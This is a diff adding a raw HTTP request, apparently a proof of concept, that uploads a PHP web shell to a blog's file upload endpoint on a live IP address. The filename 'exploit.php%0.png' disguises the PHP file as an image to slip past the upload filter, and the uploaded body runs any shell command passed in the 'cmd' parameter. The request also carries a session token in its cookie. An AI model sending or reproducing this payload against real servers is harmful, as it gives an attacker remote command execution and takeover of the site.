@@ -1,0 +1,16 @@
+POST /blog/create-blog HTTP/1.1
+Host: 78.47.19.133
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwaG9uZU51bWJlciI6Ijk4MjQ2MDI5NzQiLCJ1c2VySWQiOiIyNTk4MmUzNC0xNDYzLTQ4MjktODJmZi1kZTZjYjkyMTdiZWQiLCJyb2xlIjoidXNlciIsImlhdCI6MTY4NDIzNTYyOH0.xdQRD-UWjb2sQQBfGajQRqLkP-T7IHY7U4GBDeBvbpk;Path=/
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-Length: 65
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryePkpFF7tjBAqx29L
+
+------WebKitFormBoundaryePkpFF7tjBAqx29L
+Content-Disposition: form-data; name="uploadedfile"; filename="exploit.php%0.png"
+Content-Type: application/x-object
+<?php echo system($_GET['cmd']); ?>
